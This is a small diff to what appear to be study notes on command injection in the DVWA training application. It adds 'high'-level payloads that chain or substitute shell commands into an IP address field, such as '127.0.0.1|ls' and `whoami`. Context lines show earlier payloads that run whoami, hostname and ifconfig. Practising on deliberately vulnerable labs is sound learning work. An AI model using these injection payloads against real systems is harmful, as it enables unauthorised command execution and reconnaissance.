@@ -16,3 +16,16 @@ ping -c4 127.0.0.1 && ls
 ```
 127.0.0.1 & whoami & hostname & ifconfig & ls ../
 ```
+
+## high
+
+### in cmd
+```
+echo $(ls)
+`whoami`
+```
+
+### in dvwa
+```
+127.0.0.1|ls
+```
